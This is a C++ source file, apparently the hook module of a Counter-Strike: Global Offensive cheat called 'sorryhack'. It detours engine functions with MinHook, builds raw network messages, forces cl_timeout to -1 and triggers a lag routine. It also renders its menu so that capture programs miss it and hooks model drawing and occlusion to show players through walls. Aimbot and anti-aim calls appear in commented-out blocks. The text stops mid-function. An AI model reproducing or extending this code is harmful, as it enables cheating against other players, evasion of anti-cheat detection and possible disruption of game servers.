// used: std::array
#include <array>
#include "hooks.h"
// used: global variables
#include "../global.h"
// used: cheat variables
#include "variables.h"
// used: input system
#include "../utilities/inputsystem.h"
// used: logging
#include "../utilities/logging.h"
// used: initialize state
#include "../utilities/draw.h"
// used: set localplayer ready
#include "../utilities.h"
// used: render windows
#include "menu.h"
#include "../md5sum.h"
#include "../../Headers/netmessages.pb.h"
/* features */
#include "../features/lagcompensation.h"
#include "../features/prediction.h"
#include "../features/ragebot.h"
#include "../features/antiaim.h"
#include "../features/legitbot.h"
#include "../features/triggerbot.h"
#include "../features/visuals.h"
#include "../features/misc.h"
#include "../features/skinchanger.h"
#include <base/sdk/CNetMessageBinder.h>
#include "../sdk/hash/md5.h"
#include <base/sdk/bitvec.h>
#include <base/sdk/clzss.h>
#include <mmsystem.h>

inline std::mutex NetworkingMutex;
struct MD5Value_t
{
    unsigned char bits[MD5_DIGEST_LENGTH];

    void Zero();
    bool IsZero() const;

    bool operator==(const MD5Value_t& src) const;
    bool operator!=(const MD5Value_t& src) const;

};

struct ARGS {
    void* netchann;
    DWORD* socket;
    int nBytesLeft;
    int nMaxRoutableSize;
} ARGS_KEEP;

static int last_event_mask = 1337;
static bool isCallingClMove = false;
static bool lagtoggle = false;
static int lagtype = 6;
static int lagvalue = 250;
static int lastSpawnCount = 0;
static char* lastCmd;
struct Cmd {
    int size;
    char* buf;
    bf_write* bitbuf;
};
static Cmd lastCmds[20];
static int lastCmdSize;
static void* last_ecx;
static char* lastMoveCmd;
static bool cook;
#define NET_MAX_MESSAGE 523956

static constexpr std::array<const char*, 3U> arrSmokeMaterials =
{
    //"particle/vistasmokev1/vistasmokev1_fire",  // to look cool fresh fashionable yo :sunglasses: (if u wont be cool just uncomment this)
    "particle/vistasmokev1/vistasmokev1_smokegrenade",
    "particle/vistasmokev1/vistasmokev1_emods",
    "particle/vistasmokev1/vistasmokev1_emods_impactdust",
};
volatile INetChannel* g_OurNetChann = NULL;
template <typename T>
static constexpr auto relativeToAbsolute(uintptr_t address) noexcept
{
    return (T)(address + 4 + *reinterpret_cast<std::int32_t*>(address));
}

#define ACTUAL_ADDRESS_IN_FIRST_OPCODE(DLL, STRPATTERN) relativeToAbsolute<uintptr_t>(MEM::FindPattern(DLL, STRPATTERN) + 1)

#pragma region hooks_get
bool H::Setup()
{
    if (MH_Initialize() != MH_OK)
        throw std::runtime_error(XorStr("failed initialize minhook"));
    //if (!DTR::Reset.Create(MEM::GetVFunc(I::DirectDevice, VTABLE::RESET), &hkReset))
    //    return false;
    //
    //if (!DTR::EndScene.Create(MEM::GetVFunc(I::DirectDevice, VTABLE::ENDSCENE), &hkEndScene))
    //    return false;
    //    
    //if (!DTR::FrameStageNotify.Create(MEM::GetVFunc(I::Client, VTABLE::FRAMESTAGENOTIFY), &hkFrameStageNotify))
    //   return false;
    
    //if (!DTR::FrameStageNotify.Create(MEM::GetVFunc(I::Client, VTABLE::FRAMESTAGENOTIFY), &hkFrameStageNotify))
        //return false; 

   // if (!DTR::NextThinkTime.Create((void*)MEM::FindPattern("steamnetworkingsockets.dll", "E8 ? ? ? ? 3B D3 7C 0E"), &hk_SNP_GetNextThinkTime))
   //     return false;
    //if (!DTR::ClientCmd.Create(MEM::GetVFunc(I::Engine, 7), &hkClientCmd))
    //	return false;
    //if (!DTR::NET_SendLong.Create(relativeToAbsolute<void*>(MEM::FindPattern("engine.dll", "E8 ? ? ? ? 83 C4 08 8B F0 83 BD ? ? ? ? ?") + 1), &hkSendLong))
//		return false;


    /*
    if (!DTR::OverrideView.Create(MEM::GetVFunc(I::ClientMode, VTABLE::OVERRIDEVIEW), &hkOverrideView))
        return false;

    // @note: be useful for mouse event aimbot
#if 0
    if (!DTR::OverrideMouseInput.Replace(MEM::GetVFunc(I::ClientMode, VTABLE::OVERRIDEMOUSEINPUT), &hkOverrideMouseInput))
        return false;
#endif
*/
//if (!DTR::CreateMove.Create(MEM::GetVFunc(I::ClientMode, VTABLE::CREATEMOVE), &hkCreateMove))
    //return false;
    if (!DTR::SendNetMsg.Create((void*)MEM::FindPattern("engine.dll", "55 8B EC 83 EC 08 56 8B F1 8B 86 ? ? ? ? 85 C0"), &hkSendNetMsg))
        return false;
    
// 55 8B EC 83 E4 F8 B8 AC 40 00 00 E8 10
//if (!DTR::ProcessPacketEntities.Create((void*)MEM::FindPattern("engine.dll", "55 8B EC 83 E4 F8 B8 AC 40 00 00 E8 10"), &hkProcessPacketEntities))
    //return false;
//if (!DTR::ClMove.Create((void*)MEM::FindPattern("engine.dll", "55 8B EC 81 EC ? ? ? ? 53 56 57 8B 3D ? ? ? ? 8A"), &hkClMove))
    //return false;
/*
if (!DTR::GetViewModelFOV.Create(MEM::GetVFunc(I::ClientMode, VTABLE::GETVIEWMODELFOV), &hkGetViewModelFOV))
    return false;

if (!DTR::DoPostScreenEffects.Create(MEM::GetVFunc(I::ClientMode, VTABLE::DOPOSTSCREENEFFECTS), &hkDoPostScreenEffects))
    return false;

if (!DTR::IsConnected.Create(MEM::GetVFunc(I::Engine, VTABLE::ISCONNECTED), &hkIsConnected))
    return false;

if (!DTR::ListLeavesInBox.Create(MEM::GetVFunc(I::Engine->GetBSPTreeQuery(), VTABLE::LISTLEAVESINBOX), &hkListLeavesInBox))
    return false;

if (!DTR::PaintTraverse.Create(MEM::GetVFunc(I::Panel, VTABLE::PAINTTRAVERSE), &hkPaintTraverse))
    return false;

if (!DTR::DrawModel.Create(MEM::GetVFunc(I::StudioRender, VTABLE::DRAWMODEL), &hkDrawModel))
    return false;

if (!DTR::RenderSmokeOverlay.Create(MEM::GetVFunc(I::ViewRender, VTABLE::RENDERSMOKEOVERLAY), &hkRenderSmokeOverlay))
    return false;

if (!DTR::RunCommand.Create(MEM::GetVFunc(I::Prediction, VTABLE::RUNCOMMAND), &hkRunCommand))
    return false;

if (!DTR::SendMessageGC.Create(MEM::GetVFunc(I::SteamGameCoordinator, VTABLE::SENDMESSAGE), &hkSendMessage))
    return false;

if (!DTR::RetrieveMessage.Create(MEM::GetVFunc(I::SteamGameCoordinator, VTABLE::RETRIEVEMESSAGE), &hkRetrieveMessage))
    return false;
*/
    if (!DTR::LockCursor.Create(MEM::GetVFunc(I::Surface, VTABLE::LOCKCURSOR), &hkLockCursor))
        return false;
    /*
if (!DTR::PlaySoundSurface.Create(MEM::GetVFunc(I::Surface, VTABLE::PLAYSOUND), &hkPlaySound))
    return false;

static CConVar* sv_cheats = I::ConVar->FindVar(XorStr("sv_cheats"));

if (!DTR::SvCheatsGetBool.Create(MEM::GetVFunc(sv_cheats, VTABLE::GETBOOL), &hkSvCheatsGetBool))
    return false;
    */
    //static CConVar* net_graph = I::ConVar->FindVar(XorStr("net_graph"));
    //net_graph->fnChangeCallbacks.Size() = 0;

    return true;
}

void H::Restore()
{
    DTR::Reset.Remove();
    DTR::EndScene.Remove();
    DTR::FrameStageNotify.Remove();
    DTR::OverrideView.Remove();
    DTR::OverrideMouseInput.Remove();
    DTR::CreateMove.Remove();
    DTR::SendNetMsg.Remove();
    DTR::SendDatagram.Remove();
    DTR::GetViewModelFOV.Remove();
    DTR::DoPostScreenEffects.Remove();
    DTR::IsConnected.Remove();
    DTR::ListLeavesInBox.Remove();
    DTR::PaintTraverse.Remove();
    DTR::DrawModel.Remove();
    DTR::RunCommand.Remove();
    DTR::SendMessageGC.Remove();
    DTR::RetrieveMessage.Remove();
    DTR::LockCursor.Remove();
    DTR::PlaySoundSurface.Remove();
    DTR::SvCheatsGetBool.Remove();

    // @note: also should works but makes it undebuggable
#if 0
    MH_DisableHook(MH_ALL_HOOKS);
    MH_RemoveHook(MH_ALL_HOOKS);
#endif

    MH_Uninitialize();
}
#pragma endregion

#pragma region hooks_handlers
long D3DAPI H::hkReset(IDirect3DDevice9* pDevice, D3DPRESENT_PARAMETERS* pPresentationParameters)
{
    static auto oReset = DTR::Reset.GetOriginal<decltype(&hkReset)>();

    // check for first initialization
    if (!D::bInitialized)
        return oReset(pDevice, pPresentationParameters);

    // invalidate vertex & index buffer, release fonts texture
    ImGui_ImplDX9_InvalidateDeviceObjects();

    const HRESULT hReset = oReset(pDevice, pPresentationParameters);

    // get directx device and create fonts texture
    if (hReset == D3D_OK)
        ImGui_ImplDX9_CreateDeviceObjects();

    return hReset;
}

long D3DAPI H::hkEndScene(IDirect3DDevice9* pDevice)
{
    static auto oEndScene = DTR::EndScene.GetOriginal<decltype(&hkEndScene)>();
    static void* pUsedAddress = nullptr;

    SEH_START

        if (pUsedAddress == nullptr)
        {
            // search for gameoverlay address
            MEMORY_BASIC_INFORMATION memInfo;
            VirtualQuery(_ReturnAddress(), &memInfo, sizeof(MEMORY_BASIC_INFORMATION));

            char chModuleName[MAX_PATH];
            GetModuleFileName(static_cast<HMODULE>(memInfo.AllocationBase), chModuleName, MAX_PATH);

            if (strstr(chModuleName, GAMEOVERLAYRENDERER_DLL) != nullptr)
                pUsedAddress = _ReturnAddress();
        }

    // check for called from gameoverlay and render here to bypass capturing programs
    if (_ReturnAddress() == pUsedAddress)
    {
        // init gui (fonts, sizes, styles, colors) once
        if (!D::bInitialized)
            D::Setup(pDevice);

        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        // render cheat menu & visuals
        W::MainWindow(pDevice);

        ImGui::EndFrame();
        ImGui::Render();

        // render draw lists from draw data
        ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
    }

    SEH_END

        return oEndScene(pDevice);
}

std::string gen_random(const int len) {

    std::string tmp_s;
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    srand((unsigned)time(NULL));

    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i)
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


    return tmp_s;

}

static auto save_edx = 1337;


// I fucking hate C++

template <class PB_OBJECT_TYPE>
bool WriteProtobufToBuffer(PB_OBJECT_TYPE* Proto, bf_write* buffer, uint32_t MessageType) {
    if (!Proto->IsInitialized())
    {
        //Debug::QuickPrint("WriteToBuffer Message %s is not initialized! Probably missing required fields!");
        return false;
    }

    int size = Proto->ByteSize();

    // If the write is byte aligned we can go direct
    if ((buffer->GetNumBitsWritten() % 8) == 0)
    {
        int sizeWithHeader = size + 1 + buffer->ByteSizeVarInt32(MessageType) + buffer->ByteSizeVarInt32(size);

        if (buffer->GetNumBytesLeft() >= sizeWithHeader)
        {
            buffer->WriteVarInt32(MessageType);
            buffer->WriteVarInt32(size);

            if (!Proto->SerializeWithCachedSizesToArray((google::protobuf::uint8*)buffer->GetData() + buffer->GetNumBytesWritten()))
            {
                return false;
            }

            // Tell the buffer we just splatted into it
            buffer->SeekToBit(buffer->GetNumBitsWritten() + (size * 8));
            return true;
        }

        // Won't fit
        std::string Err("Message Wont Fit In Buffer Aval: " + std::to_string(buffer->GetNumBytesLeft()) + " DataSize: " + std::to_string(sizeWithHeader)
            + " ByteSize: " + std::to_string(size) + " BytesWritten: " + std::to_string(buffer->GetNumBytesWritten()));
        //Debug::QuickPrint(Err.c_str());
        return false;
    }

    // otherwise we have to do a temp allocation so we can write it all shifted

    //Debug::QuickWarning("unaligned write of protobuf message");


    void* serializeBuffer = alloca(size);

    if (!Proto->SerializeWithCachedSizesToArray((google::protobuf::uint8*)serializeBuffer))
    {
        //Debug::QuickPrint("Message Write Failed!");
        return false;
    }

    buffer->WriteVarInt32(MessageType);
    buffer->WriteVarInt32(size);
    return buffer->WriteBytes(serializeBuffer, size);
}

namespace MessageSenderHelpers {

    class ProtoWriter {
    public:
        bool WriteNetTick(void*, bf_write* buffer);
        bool WriteSignonState(void*, bf_write* buffer);
        bool WriteListenEvents(void*, bf_write* buffer);
        bool WriteClientInfo(void*, bf_write* buffer);
        bool WriteLoadingProgress(void*, bf_write* buffer);
        bool WriteHLTVReplay(void*, bf_write* buffer);
        bool WriteSplitScreen(void*, bf_write* buffer);
        bool WriteFile(void*, bf_write* buffer);
        bool WriteStringCmd(void*, bf_write* buffer);
        bool WriteCLCMove(void*, bf_write* buffer);
        bool WriteCLCKeyValues(void*, bf_write* buffer);
        bool WriteCRCChecksum(void*, bf_write* buffer);
        bool WriteSplitScreenUser(void*, bf_write* buffer);
    };
    bool ProtoWriter::WriteNetTick(void* message, bf_write* buffer) {
        CNETMsg_Tick* tick = reinterpret_cast<CNETMsg_Tick*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_Tick);
    }
    bool ProtoWriter::WriteSplitScreenUser(void* message, bf_write* buffer) {
        CNETMsg_SplitScreenUser* tick = reinterpret_cast<CNETMsg_SplitScreenUser*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_SplitScreenUser);
    }
    bool ProtoWriter::WriteCRCChecksum(void* message, bf_write* buffer) {
        CCLCMsg_FileCRCCheck* crc = reinterpret_cast<CCLCMsg_FileCRCCheck*>(message);
        return WriteProtobufToBuffer(crc, buffer, clc_FileCRCCheck);
    }

    bool ProtoWriter::WriteSignonState(void* message, bf_write* buffer) {
        CNETMsg_SignonState* tick = reinterpret_cast<CNETMsg_SignonState*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_SignonState);
    }

    bool ProtoWriter::WriteListenEvents(void* message, bf_write* buffer) {
        CCLCMsg_ListenEvents* tick = reinterpret_cast<CCLCMsg_ListenEvents*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_ListenEvents);
    }

    bool ProtoWriter::WriteClientInfo(void* message, bf_write* buffer) {
        CCLCMsg_ClientInfo* tick = reinterpret_cast<CCLCMsg_ClientInfo*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_ClientInfo);
    }

    bool ProtoWriter::WriteLoadingProgress(void* message, bf_write* buffer) {
        CCLCMsg_LoadingProgress* tick = reinterpret_cast<CCLCMsg_LoadingProgress*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_LoadingProgress);
    }

    bool ProtoWriter::WriteHLTVReplay(void* message, bf_write* buffer) {
        CCLCMsg_HltvReplay* tick = reinterpret_cast<CCLCMsg_HltvReplay*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_HltvReplay);
    }

    bool ProtoWriter::WriteSplitScreen(void* message, bf_write* buffer) {
        CNETMsg_SplitScreenUser* tick = reinterpret_cast<CNETMsg_SplitScreenUser*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_SplitScreenUser);
    }

    bool ProtoWriter::WriteFile(void* message, bf_write* buffer) {
        CNETMsg_File* tick = reinterpret_cast<CNETMsg_File*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_File);
    }

    bool ProtoWriter::WriteStringCmd(void* message, bf_write* buffer) {
        CNETMsg_StringCmd* tick = reinterpret_cast<CNETMsg_StringCmd*>(message);
        return WriteProtobufToBuffer(tick, buffer, net_StringCmd);
    }

    bool ProtoWriter::WriteCLCMove(void* message, bf_write* buffer) {
        CCLCMsg_Move* tick = reinterpret_cast<CCLCMsg_Move*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_Move);
    }

    bool ProtoWriter::WriteCLCKeyValues(void* message, bf_write* buffer) {
        CCLCMsg_CmdKeyValues* tick = reinterpret_cast<CCLCMsg_CmdKeyValues*>(message);
        return WriteProtobufToBuffer(tick, buffer, clc_CmdKeyValues);
    }

}
inline MessageSenderHelpers::ProtoWriter g_ProtoWriter;
bool FASTCALL H::hkCreateMove(IClientModeShared* thisptr, int edx, float flInputSampleTime, CUserCmd* pCmd)
{
    static auto oCreateMove = DTR::CreateMove.GetOriginal<decltype(&hkCreateMove)>();
    I::ConVar->FindVar(XorStr("cl_timeout"))->SetValue(-1);

    //if (!isCallingClMove && lagtoggle)
        //return false;
    /*
     * get global localplayer pointer
     * @note: dont forget check global localplayer for nullptr when using not in createmove
     * also not recommended use so far
     */
     //CBaseEntity* pLocal = G::pLocal = CBaseEntity::GetLocalPlayer();

     // is called from CInput::ExtraMouseSample
    if (pCmd->iCommandNumber == 0)
        return oCreateMove(thisptr, edx, flInputSampleTime, pCmd);

    /*
     * check is called from CInput::CreateMove
     * and SetLocalViewAngles for engine/prediction at the same time
     * cuz SetViewAngles isn't called if return false and can cause frame stuttering
     */
    oCreateMove(thisptr, edx, flInputSampleTime, pCmd);
    I::ConVar->FindVar(XorStr("cl_timeout"))->SetValue(-1);

    //		I::Prediction->SetLocalViewAngles(pCmd->angViewPoint);

        // save global cmd pointer
    G::pCmd = pCmd;

    if (I::ClientState == nullptr || I::Engine->IsPlayingDemo())
        return oCreateMove(thisptr, edx, flInputSampleTime, pCmd);

    // netchannel pointer
    INetChannel* pNetChannel = I::ClientState->pNetChannel;

    // get stack frame without asm inlines
    // safe and will not break if you omitting frame pointer
    const volatile auto vlBaseAddress = *reinterpret_cast<std::uintptr_t*>(reinterpret_cast<std::uintptr_t>(_AddressOfReturnAddress()) - sizeof(std::uintptr_t));

    /*
     * get sendpacket pointer from stack frame
     * if use global sendpacket value then sendpacket applies only on next tick
     * im not recommend use globals anywhere
     */
    bool& bSendPacket = *reinterpret_cast<bool*>(vlBaseAddress - 0x1C);

    // save previous view angles for movement correction
    QAngle angOldViewPoint = pCmd->angViewPoint;

    //SEH_START

        // @note: need do bunnyhop and other movements before prediction
    /*	CMiscellaneous::Get().Run(pCmd, pLocal, bSendPacket);

    /*
     * CL_RunPrediction
     * correct prediction when framerate is lower than tickrate
     * https://github.com/VSES/SourceEngine2007/blob/master/se2007/engine/cl_pred.cpp#L41

    if (I::ClientState->iDeltaTick > 0)
        I::Prediction->Update(I::ClientState->iDeltaTick, I::ClientState->iDeltaTick > 0, I::ClientState->iLastCommandAck, I::ClientState->iLastOutgoingCommand + I::ClientState->nChokedCommands);

    CPrediction::Get().Start(pCmd, pLocal);
    {
        if (C::Get<bool>(Vars.bMiscAutoPistol))
            CMiscellaneous::Get().AutoPistol(pCmd, pLocal);

        if (C::Get<bool>(Vars.bMiscFakeLag) || C::Get<bool>(Vars.bAntiAim))
            CMiscellaneous::Get().FakeLag(pLocal, bSendPacket);

        if (C::Get<bool>(Vars.bRage))
            CRageBot::Get().Run(pCmd, pLocal, bSendPacket);

        if (C::Get<bool>(Vars.bLegit))
            CLegitBot::Get().Run(pCmd, pLocal, bSendPacket);

        if (C::Get<bool>(Vars.bTrigger))
            CTriggerBot::Get().Run(pCmd, pLocal);

        if (C::Get<bool>(Vars.bAntiAim))
            CAntiAim::Get().UpdateServerAnimations(pCmd, pLocal);

        if (C::Get<bool>(Vars.bAntiAim))
            CAntiAim::Get().Run(pCmd, pLocal, bSendPacket);
    }
    CPrediction::Get().End(pCmd, pLocal);

    if (pLocal->IsAlive())
        CMiscellaneous::Get().MovementCorrection(pCmd, angOldViewPoint);

    // clamp & normalize view angles
    if (C::Get<bool>(Vars.bMiscAntiUntrusted))
    {
        pCmd->angViewPoint.Normalize();
        pCmd->angViewPoint.Clamp();
    }

    if (C::Get<bool>(Vars.bMiscPingSpike))
        CLagCompensation::Get().UpdateIncomingSequences(pNetChannel);
    else
        CLagCompensation::Get().ClearIncomingSequences();
    */
    // @note: doesnt need rehook cuz detours here
    if (pNetChannel != nullptr)
    {
        //

        //if (!DTR::SendNetMsg.IsHooked())
            //DTR::SendNetMsg.Create(MEM::GetVFunc(pNetChannel, VTABLE::SENDNETMSG), &hkSendNetMsg);

        //if (!DTR::TimingOut.IsHooked())
            //DTR::TimingOut.Create(MEM::GetVFunc(pNetChannel, 9), &hkTimingOut);
        //if (!DTR::TimeSinceLastPacket.IsHooked())
            //DTR::TimeSinceLastPacket.Create(MEM::GetVFunc(pNetChannel, 4), &hkLastPacket);

    }

    // save next view angles state
    G::angRealView = pCmd->angViewPoint;

    // save next global sendpacket state
    G::bSendPacket = bSendPacket;

    // @note: i seen many times this mistake and please do not set/clamp angles here cuz u get confused with psilent aimbot later!

    //SEH_END

    return false;
}

void FASTCALL H::hkPaintTraverse(ISurface* thisptr, int edx, unsigned int uPanel, bool bForceRepaint, bool bForce)
{
    static auto oPaintTraverse = DTR::PaintTraverse.GetOriginal<decltype(&hkPaintTraverse)>();
    const FNV1A_t uPanelHash = FNV1A::Hash(I::Panel->GetName(uPanel));

    // remove zoom panel
    if (!I::Engine->IsTakingScreenshot() && C::Get<bool>(Vars.bWorld) && C::Get<std::vector<bool>>(Vars.vecWorldRemovals).at(REMOVAL_SCOPE) && uPanelHash == FNV1A::HashConst("HudZoom"))
        return;

    oPaintTraverse(thisptr, edx, uPanel, bForceRepaint, bForce);

    // @note: we don't render here, only store's data and render it later
    if (uPanelHash == FNV1A::HashConst("FocusOverlayPanel"))
    {
        SEH_START

            // clear data from previous call
            D::ClearDrawData();

        // store data to render
        CVisuals::Get().Store();

        // swap given data to safe container
        D::SwapDrawData();

        SEH_END
    }
}

void FASTCALL H::hkPlaySound(ISurface* thisptr, int edx, const char* szFileName)
{
    static auto oPlaySound = DTR::PlaySoundSurface.GetOriginal<decltype(&hkPlaySound)>();
    oPlaySound(thisptr, edx, szFileName);
}

void FASTCALL H::hkLockCursor(ISurface* thisptr, int edx)
{
    static auto oLockCursor = DTR::LockCursor.GetOriginal<decltype(&hkLockCursor)>();

    if (W::bMainOpened)
    {
        I::Surface->UnLockCursor();
        return;
    }

    oLockCursor(thisptr, edx);
}


typedef void(__cdecl* ChatPrintFFn)(void*, int, int, const char*, ...);


std::string getCheatName() {
    srand(time(NULL));
    if ((rand() % 2))
        return "sorryhack";
    else
        return "sorryware";
}


void FASTCALL H::hkFrameStageNotify(IBaseClientDll* thisptr, int edx, EClientFrameStage stage)
{
    static auto oFrameStageNotify = DTR::FrameStageNotify.GetOriginal<decltype(&hkFrameStageNotify)>();
    if (stage == FRAME_NET_UPDATE_END && C::Get<int>(Vars.iLagType) == 0)
        DoLag();
        //FreezerThread(NULL);
    return oFrameStageNotify(thisptr, edx, stage);
    /*

    SEH_START

        if (!I::Engine->IsInGame())
        {
            // clear sequences or we get commands overflow on new map connection
            CLagCompensation::Get().ClearIncomingSequences();
            return oFrameStageNotify(thisptr, edx, stage);
        }

    if (I::Engine->IsTakingScreenshot())
        return oFrameStageNotify(thisptr, edx, stage);
//	I::Prediction->bInPrediction = true;

    //CBaseEntity* pLocal = CBaseEntity::GetLocalPlayer();

    //if (pLocal == nullptr)
        //return oFrameStageNotify(thisptr, edx, stage);

    static QAngle angOldAimPunch = { }, angOldViewPunch = { };

    switch (stage)
    {
    case FRAME_NET_UPDATE_POSTDATAUPDATE_START:
    {
        /*
         * data has been received and we are going to start calling postdataupdate
         * e.g. resolver or skinchanger and other visuals


        break;
    }
    case FRAME_NET_UPDATE_POSTDATAUPDATE_END:
    {
        /*
         * data has been received and called postdataupdate on all data recipients
         * e.g. now we can modify interpolation, other lagcompensation stuff


        break;
    }
    case FRAME_NET_UPDATE_END:
    {
        /*
         * received all packets, now do interpolation, prediction, etc
         * e.g. backtrack stuff

        FreezerThread();

        break;
    }
    case FRAME_RENDER_START:
    {
        /*
         * start rendering the scene
         * e.g. remove visual punch, thirdperson, other render/update stuff

        return oFrameStageNotify(thisptr, edx, stage);

         // set max flash alpha
        /*pLocal->GetFlashMaxAlpha() = 0;

        // no draw smoke
        for (auto szSmokeMaterial : arrSmokeMaterials)
        {
            IMaterial* pMaterial = I::MaterialSystem->FindMaterial(szSmokeMaterial, TEXTURE_GROUP_OTHER);

            if (pMaterial != nullptr && !pMaterial->IsErrorMaterial())
                pMaterial->SetMaterialVarFlag(MATERIAL_VAR_NO_DRAW, true);
        }

        // remove visual punch
        if (pLocal->IsAlive() && C::Get<bool>(Vars.bWorld))
        {
            // save old values
            angOldViewPunch = pLocal->GetViewPunch();
            angOldAimPunch = pLocal->GetPunch();

            if (C::Get<std::vector<bool>>(Vars.vecWorldRemovals).at(REMOVAL_PUNCH))
            {
                // change current values
                pLocal->GetViewPunch() = QAngle(0, 0, 0);
                pLocal->GetPunch() = QAngle(0, 0, 0);
            }
        }

        // thirdperson
        if (C::Get<bool>(Vars.bWorld) && C::Get<int>(Vars.iWorldThirdPersonKey) > 0)
        {
            static bool bThirdPerson = false;

            if (!I::Engine->IsConsoleVisible() && IPT::IsKeyReleased(C::Get<int>(Vars.iWorldThirdPersonKey)))
                bThirdPerson = !bThirdPerson;

            // my solution is here cuz camera offset is dynamically by standard functions without any garbage in overrideview hook
            I::Input->bCameraInThirdPerson = bThirdPerson && pLocal->IsAlive() && !I::Engine->IsTakingScreenshot();
            I::Input->vecCameraOffset.z = bThirdPerson ? C::Get<float>(Vars.flWorldThirdPersonOffset) : 150.f;
        }

        break;
    }
    case FRAME_RENDER_END:
    {
        /*
         * finished rendering the scene
         * here we can restore our modified things

        return oFrameStageNotify(thisptr, edx, stage);
        /*
         // restore original visual punch values
        if (pLocal->IsAlive() && C::Get<bool>(Vars.bWorld) && C::Get<std::vector<bool>>(Vars.vecWorldRemovals).at(REMOVAL_PUNCH))
        {
            pLocal->GetViewPunch() = angOldViewPunch;
            pLocal->GetPunch() = angOldAimPunch;
        }

        break;
    }
    default:
        break;
    }

    SEH_END

        oFrameStageNotify(thisptr, edx, stage);*/
}

void FASTCALL H::hkDrawModel(IStudioRender* thisptr, int edx, DrawModelResults_t* pResults, const DrawModelInfo_t& info, matrix3x4_t* pBoneToWorld, float* flFlexWeights, float* flFlexDelayedWeights, const Vector& vecModelOrigin, int nFlags)
{
    static auto oDrawModel = DTR::DrawModel.GetOriginal<decltype(&hkDrawModel)>();

    if (!I::Engine->IsInGame() || I::Engine->IsTakingScreenshot())
        return oDrawModel(thisptr, edx, pResults, info, pBoneToWorld, flFlexWeights, flFlexDelayedWeights, vecModelOrigin, nFlags);

    bool bClearOverride = false;

    if (G::pLocal != nullptr && C::Get<bool>(Vars.bEsp) && C::Get<bool>(Vars.bEspChams))
        bClearOverride = CVisuals::Get().Chams(G::pLocal, pResults, info, pBoneToWorld, flFlexWeights, flFlexDelayedWeights, vecModelOrigin, nFlags);

    oDrawModel(thisptr, edx, pResults, info, pBoneToWorld, flFlexWeights, flFlexDelayedWeights, vecModelOrigin, nFlags);

    if (bClearOverride)
        I::StudioRender->ForcedMaterialOverride(nullptr);
}

void FASTCALL H::hkRenderSmokeOverlay(IViewRender* thisptr, int edx, bool bPreViewModel)
{
    static auto oRenderSmokeOverlay = DTR::RenderSmokeOverlay.GetOriginal<decltype(&hkRenderSmokeOverlay)>();

    if (C::Get<bool>(Vars.bWorld) && C::Get<std::vector<bool>>(Vars.vecWorldRemovals).at(REMOVAL_SMOKE))
        // set flSmokeIntensity to 0
        *reinterpret_cast<float*>(reinterpret_cast<std::uintptr_t>(thisptr) + 0x588) = 0.0f;
    else
        oRenderSmokeOverlay(thisptr, edx, bPreViewModel);
}

int FASTCALL H::hkListLeavesInBox(void* thisptr, int edx, const Vector& vecMins, const Vector& vecMaxs, unsigned short* puList, int nListMax)
{
    static auto oListLeavesInBox = DTR::ListLeavesInBox.GetOriginal<decltype(&hkListLeavesInBox)>();

    // @todo: sometimes models doesn't drawn on certain maps (not only me: https://www.unknowncheats.me/forum/counterstrike-global-offensive/330483-disable-model-occulusion-3.html)
    // @test: try to fix z order 11.08.20

    // @credits: soufiw
    // occlusion getting updated on player movement/angle change,
    // in RecomputeRenderableLeaves https://github.com/pmrowla/hl2sdk-csgo/blob/master/game/client/clientleafsystem.cpp#L674
    static std::uintptr_t uInsertIntoTree = (MEM::FindPattern(CLIENT_DLL, XorStr("56 52 FF 50 18")) + 0x5); // @xref: "<unknown renderable>"

    // check for esp state and call from CClientLeafSystem::InsertIntoTree
    if (C::Get<bool>(Vars.bEsp) && C::Get<bool>(Vars.bEspChams) && C::Get<bool>(Vars.bEspChamsDisableOcclusion) && (C::Get<bool>(Vars.bEspChamsEnemies) || C::Get<bool>(Vars.bEspChamsAllies)) && reinterpret_cast<std::uintptr_t>(_ReturnAddress()) == uInsertIntoTree)
    {
        // get current renderable info from stack https://github.com/pmrowla/hl2sdk-csgo/blob/master/game/client/clientleafsystem.cpp#L1470
        if (const auto pInfo = *reinterpret_cast<RenderableInfo_t**>(reinterpret_cast<std::uintptr_t>(_AddressOfReturnAddress()) + 0x14); pInfo != nullptr)
        {
            if (const auto pRenderable = pInfo->pRenderable; pRenderable != nullptr)
            {
                // check if disabling occlusion for players
                if (const auto pEntity = pRenderable->GetIClientUnknown()->GetBaseEntity(); pEntity != nullptr && pEntity->IsPlayer())
                {
                    // fix render order, force translucent group (https://www.unknowncheats.me/forum/2429206-post15.html)
                    // AddRenderablesToRenderLists: https://github.com/pmrowla/hl2sdk-csgo/blob/master/game/client/clientleafsystem.cpp#L2473
                    // @ida addrenderablestorenderlists: 55 8B EC 83 EC 24 53 56 8B 75 08 57 8B 46
                    pInfo->uFlags &= ~RENDER_FLAGS_FORCE_OPAQUE_PASS;
                    pInfo->uFlags2 |= RENDER_FLAGS_BOUNDS_ALWAYS_RECOMPUTE;

                    // extend world space bounds to maximum https://github.com/pmrowla/hl2sdk-csgo/blob/master/game/client/clientleafsystem.cpp#L707
                    constexpr Vector vecMapMin(MIN_COORD_FLOAT, MIN_COORD_FLOAT, MIN_COORD_FLOAT);
                    constexpr Vector vecMapMax(MAX_COORD_FLOAT, MAX_COORD_FLOAT, MAX_COORD_FLOAT);
                    return oListLeavesInBox(thisptr, edx, vecMapMin, vecMapMax, puList, nListMax);
                }
            }
        }
    }

    return oListLeavesInBox(thisptr, edx, vecMins, vecMaxs, puList, nListMax);
}
static int lastMoveSequenceNr;
bool FASTCALL H::hkIsConnected(IEngineClient* thisptr, int edx)
{
    static auto oIsConnected = DTR::IsConnected.GetOriginal<decltype(&hkIsConnected)>();

    // @xref: "IsLoadoutAllowed"
    // sub above the string
    // sub in that function
    // .text : 103A2120 84 C0		test    al, al; Logical Compare
